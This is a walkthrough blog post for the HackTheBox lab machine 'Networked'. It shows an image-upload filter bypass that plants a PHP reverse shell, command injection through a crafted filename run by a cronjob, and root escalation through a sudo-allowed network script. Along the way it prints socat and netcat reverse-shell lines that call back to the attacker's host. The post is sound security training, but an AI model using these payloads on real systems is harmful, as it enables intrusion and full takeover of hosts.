---
layout:     post
title:      Networked (HTB)
date:       2019-11-16 10:00:00
summary:    Write-up of HackTheBox's Networked.
categories: writeup
thumbnail: plug
tags:
 - hackthebox
 - writeup
 - walkthrough

---

![](/images/networked/infocard.png)

Networked was a great opportunity to dig into scripts, learn how they work, and think creatively about how they can be abused. You don't need much (if any) experience with PHP to get through this box; as long as you know some programming basics and don't mind researching functions on [php.net](https://www.php.net), you'll be able to put it all together.

# Initial Scan

{% highlight plaintext %}
root@kali:~# nmap -sC -sV 10.10.10.146
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-28 18:09 EDT
Nmap scan report for 10.10.10.146
Host is up (0.053s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
{% endhighlight %}

The only interesting port is Port 80, so I start there.

# Web discovery

I fuzz for directories. Given that Apache and PHP appear in my nmap scan, I check for files that end in __.php__.

{% highlight plaintext %}
root@kali:~# gobuster dir -u http://10.10.10.146 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x php
===============================================================                                     
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                     
===============================================================                                     
[+] Url:            http://10.10.10.146
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt          
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================                                     
2019/09/28 18:15:20 Starting gobuster
===============================================================                                     
/index.php (Status: 200)
/uploads (Status: 301)
/photos.php (Status: 200)
/upload.php (Status: 200)
/lib.php (Status: 200)
/backup (Status: 301)
===============================================================                                     
2019/09/28 18:55:42 Finished
===============================================================                                     
{% endhighlight %}

### Testing uploads

At __/upload.php__, I find a basic file uploader. 

![](/images/networked/image1.png)

If I upload a TXT file, it fails.

![](/images/networked/image2.png)

But if I try an image file—like a PNG—it succeeds.

![](/images/networked/image3.png)

My uploaded image can be found at __/photos.php__ (on the left).

![](/images/networked/image4.png)

To exploit this, I'd want to upload a PHP reverse shell. Then I could trigger it by simply visiting /photos.php. 

But uploading a PHP file yields the same error as when uploading a TXT file. Clearly there's some filtering going on in the file upload function.

### A note on trial and error

In the HackTheBox forums, I gathered that a lot of folks simply tried a few common upload bypass techniques and got initial access. The technique used for Networked is incredibly similar to the one used on another retired box. So if you already have that technique somewhere in your mental to-do list, you'll get through this part by pure trial and error.

But guessing likely isn't the intended method. If you analyze the source code, you can _know_ what the technique is before you try it. This is the more valuable lesson to take away from this box.

# Analyzing the PHP files

In the __/backup__ directory, all the PHP code is readily available in a TAR file.

![](/images/networked/image5.png)

Just extract it, and you'll see the code behind all the web pages.

![](/images/networked/image6.png)

What's relevant to our exploit are __upload.php__—which shows the code behind the upload page—and __lib.php__—which defines the functions used in upload.php.

### upload.php

Here's an excerpt from __upload.php__:

{% highlight php %}
    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }
{% endhighlight %}

This tells me that if the file ends in ".jpg", ".png", ".gif", or ".jpeg", `$valid` will be set to `true`. I need to make sure my reverse shell meets this criteria.

Another important snippet shows why I'm triggering that error message:

{% highlight php %}
    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }
{% endhighlight %}

This indicates that if my file doesn't return True for the __check_file_type__ function (or is larger than 60,000 bytes), I'll get the "Invalid image file" error. 

### lib.php 

The check_file_type function is in lib.php:

{% highlight php %}
    function check_file_type($file) {
      $mime_type = file_mime_type($file);
      if (strpos($mime_type, 'image/') === 0) {
          return true;
      } else {
          return false;
      }  
    }
{% endhighlight %}

If the file content type begins with 'image/' (as JPG, PNG, and GIF files do), my file will pass the test. Another important thing to add to my checklist.

And what does the __file_mime_type__ function do?

{% highlight php %}
    function file_mime_type($file) {
      $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
      if (function_exists('finfo_file')) {
        $finfo = finfo_open(FILEINFO_MIME);
        if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
        {
          $mime = @finfo_file($finfo, $file['tmp_name']);
          finfo_close($finfo);
          if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
            $file_type = $matches[1];
            return $file_type;
          }
        }
      }
{% endhighlight %}

If my file matches on the regex in the second line, it should pass as well.

### Recap of criteria

So my file has to meet all of the following criteria:

* The filename must end in ".jpg", ".png", ".gif", or ".jpeg".
* The content type must begin with "image/".
* The filename must match the regex "/^([a-z\\-]+\/[a-z0-9\\-\\.\\+]+)(;\s.+)?$/".

<br>
I head over to [https://regex101.com/](https://regex101.com/) and paste in the regex. Here I can safely mess around with common upload bypasses, see if they match the regex, and avoid submitting dozens of garbage uploads to the victim. Per my checklist, I must keep an image file extension at the end (e.g. ".png").

Here's one that appears to work:

![](/images/networked/image7.png)

Although I'll satisfy having ".png" at the end of the string, the extra dots in the middle will terminate the filename before the .png. So when I do a GET request on my image, it'll behave as if it were a PHP file.

# Performing the bypass

It's also important to test if there are any checks on the file content itself. Will I be allowed to include PHP code in my decoy PNG file? I don't see anything relevant in the PHP files, so all I can do is test.

I intercept my normal file upload with Burp. The filename, Content-Type, and content itself look like this.

![](/images/networked/image8.png)

So I create a PHP reverse shell (using the one in /usr/share/webshells/) and paste it right after my PNG content ends.

![](/images/networked/image9.png)

I forward the request, and my upload succeeds.

![](/images/networked/image3.png)

This means that the upload does no checks to see if there's any PHP code in the image. (It may check for "magic bytes" in the beginning of the file, which is why I was careful to preserve the PNG and add the PHP _after_ the PNG content.)

To execute the code, we need the file to have the .php extension, not .png, so I send the upload again with the PHP code—but I also modify the filename like this:

![](/images/networked/image10.png)

As with before, it succeeds.

![](/images/networked/image3.png)

I set up my netcat listener:

{% highlight plaintext %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
{% endhighlight %}

Then I visit /photos.php to trigger the payload. I see my filename on the page, but no image.

![](/images/networked/image11.png)

Back on my listener, I get a shell as user Apache.

{% highlight plaintext %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.146] 57646
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 02:54:28 up  2:45,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ 
{% endhighlight %}

I upgrade to a Python TTY to make life easier.

{% highlight plaintext %}
sh-4.2$ python -c 'import pty;pty.spawn("/bin/bash")'
{% endhighlight %}

# Analyzing the cronjob

In the user Guly's home folder, I find:

* __user.txt__ — with no permission to read
* __check_attack.php__ — a script that checks if filenames have been modified (and if so, alerts the user Guly)
* __crontab.guly__ — a cronjob that executes check_attack.php every 3 minutes. We can assume this is under the context of user Guly, given the filename and location.

<br>
These are the contents of crontab.guly:

{% highlight plaintext %}
bash-4.2$ cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
{% endhighlight %}

Let's see what check_attack.php does (comments are mine).

{% highlight php %}
<?php

# Invoking functions from lib.php

require '/var/www/html/lib.php';

# Setting up variables, including fields for an e-mail

$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

# Below will scan all files in /var/www/html/uploads 
# and place them in the $files array.

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }

# Ensuring that all filenames are a valid IP address.
# The check_ip function is found in lib.php.

  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

# If the filename is not an IP address, echo "attack!"
# and place the file contents in the e-mail message.

  if (!($check[0])) {
    echo "attack!\n";
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);                                       

# Delete the file.

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");                                        
    echo "rm -f $path$value\n";
    
# Mail the file to Guly.
    
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
{% endhighlight %}

Ideally, I'd want to tweak the script to give me a shell, but I don't have permission to modify it. If you take a closer look, you'll notice there's one variable you do have control over: __the filenames in the uploads folder ($value)__. 

# Gaining command execution for Guly

If I add or rename a file in /var/www/html/uploads, I can insert my own input into $value in the script. But it's tough to know exactly where in the script this would be effective. 

Luckily, I can get an idea of what's going on with the "echo" commands throughout. And I can test executing the PHP file as the Apache user—before I let the cronjob (i.e., user Guly) execute it.

First, I create an empty test file (test.txt) and drop it in the uploads folder.

{% highlight plaintext %}
bash-4.2$ cd /var/www/html/uploads
cd /var/www/html/uploads
bash-4.2$ touch "test.txt"
touch "test.txt"
{% endhighlight %}

Now that "test.txt" should be assigned to $value, I execute the PHP script and see what the output tells me.

{% highlight plaintext %}
bash-4.2$ php /home/guly/check_attack.php
php /home/guly/check_attack.php
attack!
rm -f /var/www/html/uploads/test.txt
{% endhighlight %}

This shows that the filename ($value) appends to the end of "rm -f /var/www/html/uploads". So in the command, I have complete control over the bolded section:

rm -f /var/www/html/uploads/__test.txt__

In the script, the actual code I'm manipulating is:

{% highlight php %}
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
{% endhighlight %}

If I create a filename that starts with a semicolon and continues with a command, I could inject a new command of my choosing for php exec() to run.

exec("nohup /bin/rm -f $path __; command-to-inject__ > /dev/null 2>&1 &");                                        

# The right reverse shell

I had trouble getting `netcat` to work here, mostly due to the slashes.

{% highlight plaintext %}
bash-4.2$ touch "; nc 10.10.14.27 4444 -e '/bin/bash'"
touch: cannot touch '; nc 10.10.14.27 4444 -e \'/bin/bash\'': No such file or directory
{% endhighlight %}

I try `socat` instead. I set up my listener on Kali:

{% highlight plaintext %}
root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:4444
{% endhighlight %}

Then I create my filename that (somehow) allows all these punctuation marks.

{% highlight plaintext %}
bash-4.2$ touch "; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.27:4444" 
{% endhighlight %}

And (again as a test) I execute the attack as user Apache.

{% highlight plaintext %}
bash-4.2$ php /home/guly/check_attack.php
attack!
nohup: ignoring input and redirecting stderr to stdout
rm -f /var/www/html/uploads/; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.27:4444
{% endhighlight %}

I get a shell as Apache on my listener. So the test worked.

{% highlight plaintext %}
root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:4444
bash-4.2$ whoami
apache
{% endhighlight %}

# Getting a shell as Guly

This time, instead of executing the file myself, I just wait for the cronjob to execute it for me under the context of Guly.

On my attacking machine, I kill the second Apache shell and create a new socat listener. On the victim machine, I create that socat payload filename. I wait for the cronjob. Within 3 minutes, I have a shell as Guly.

{% highlight plaintext %}
root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:4444  
[guly@networked ~]$ 
{% endhighlight %}

And I can grab user.txt.

{% highlight plaintext %}
[guly@networked ~]$ cat user.txt
526c############################
{% endhighlight %}

# Another exploitable script: changename.sh

I run `sudo -l` to see everything Guly is allowed to run as root, and I find another exploitable script to play with.

{% highlight plaintext %}
[guly@networked /]$ sudo -l
<--- snip --->
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
{% endhighlight %}

This is changename.sh:

{% highlight bash %}
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
{% endhighlight %}

This script changes some values in a configuration file regarding the network interface guly0. I check the configuration file.

{% highlight plaintext %}
[guly@networked ~]$ cat /etc/sysconfig/network-scripts/ifcfg-guly
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=ps /tmp/foo
PROXY_METHOD=asodih
BROWSER_ONLY=asdoih
BOOTPROTO=asdoih
{% endhighlight %}

When I run changename.sh as Guly without sudo, it prompts me to change each field (where I enter "test"), but I don't have permission to do so.

{% highlight plaintext %}
[guly@networked ~]$ changename.sh
/usr/local/sbin/changename.sh: line 2: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
interface NAME:
test
/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
interface PROXY_METHOD:
test
/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
interface BROWSER_ONLY:
test
/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
interface BOOTPROTO:
test
/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
grep: /etc/sysconfig/network-scripts/ifcfg-ens33: Permission denied
grep: /etc/sysconfig/network-scripts/ifcfg-ens33: Permission denied
/etc/sysconfig/network-scripts/ifcfg-guly: line 4: /tmp/foo: No such file or directory
Users cannot control this device.
{% endhighlight %}

### Testing command execution

What's strange is that second to last line: "/tmp/foo: No such file or directory". It implies that something at /tmp/foo is trying to be executed, but there's no file there. /tmp is usually a world-writable directory, so I try to add my own "foo" file there and rerun the script. My "foo" file will just echo out the word "test".

{% highlight plaintext %}
[guly@networked ~]$ echo "echo test" > /tmp/foo                                                     
[guly@networked ~]$ chmod 777 /tmp/foo                                                              
[guly@networked ~]$ changename.sh                                                                   
{% endhighlight %}

In the changename.sh output, I see that "test" was echoed.

{% highlight plaintext %}
/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
grep: /etc/sysconfig/network-scripts/ifcfg-ens33: Permission denied                                 
grep: /etc/sysconfig/network-scripts/ifcfg-ens33: Permission denied                                 
test                                                                                                
Users cannot control this device.                                                                   
{% endhighlight %}

So if I store any command as /tmp/foo, the user running changename.sh will execute it.

### Reading root.txt

If I create a /tmp/foo file that contains "cat /root/root.txt", I can sudo the changename.sh script so that root will execute my command (and show the contents of the root flag). 

I'll also have to be careful to preserve the "NAME" field (ps /tmp/foo). Unlike Guly, root can actually modify the fields, and this will likely mess up whatever is executing the foo file.

{% highlight plaintext %}
[guly@networked ~]$ echo "cat /root/root.txt" > /tmp/foo
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh                                             
interface NAME:
ps /tmp/foo
interface PROXY_METHOD:                                                                             
s                      
interface BROWSER_ONLY:
s                                                                                                   
interface BOOTPROTO:   
s
0a8e############################                                                                    
0a8e############################
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delay
ing initialization.                                                                                 
{% endhighlight %}

As expected, the flag appears in the output.

### Bonus: root shell

The technique to read the flag doesn't take much modifying to get root shell. First, I set up a netcat listener.

{% highlight plaintext %}
root@kali:~# nc -nlvp 3333
listening on [any] 3333 ...
{% endhighlight %}

Then I simply replace /tmp/foo with a netcat command.

{% highlight plaintext %}
[guly@networked ~]$ echo "nc -e /bin/bash 10.10.14.27 3333" > /tmp/foo
[guly@networked ~]$ chmod 777 /tmp/foo
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh                
interface NAME:
ps /tmp/foo
interface PROXY_METHOD:
s
interface BROWSER_ONLY:
s
interface BOOTPROTO:
s
{% endhighlight %}

Back on my listener, I get a root shell.

{% highlight plaintext %}
root@kali:~# nc -nlvp 3333
listening on [any] 3333 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.146] 47768
whoami
root
{% endhighlight %}